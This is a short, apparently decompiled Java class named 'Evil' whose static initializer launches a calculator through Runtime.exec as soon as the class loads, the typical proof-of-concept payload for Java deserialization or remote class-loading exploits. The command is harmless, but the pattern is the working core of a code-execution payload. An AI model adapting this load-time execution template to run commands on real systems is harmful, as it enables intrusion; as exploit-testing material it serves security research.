public class Evil {
   static {
      try {
         Runtime var0 = Runtime.getRuntime();
         String[] var1 = new String[]{"open", "calc.exe"};
         System.out.println("success");
         Process var2 = var0.exec(var1);
         var2.waitFor();
      } catch (Exception var3) {
         System.out.println("error");
      }

   }
}
